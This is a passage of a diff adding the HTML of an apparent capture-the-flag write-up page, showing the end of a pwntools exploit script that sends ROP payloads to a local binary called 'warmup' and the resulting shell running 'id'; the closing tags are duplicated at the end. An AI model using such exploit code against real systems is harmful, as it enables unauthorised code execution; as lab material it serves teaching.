+payload2</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x0299d2</span><span class="p">)</span><span class="c1"> # leave; ret;</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">">>"</span><span class="p">, payload1)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">">>"</span><span class="p">, payload2)
+
+shell.recvline()
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './warmup': pid 317476  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+</span><span class="ro">$ </span><span class="p">id
+uid=1000(user) gid=1000(user) groups=1000(user)
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
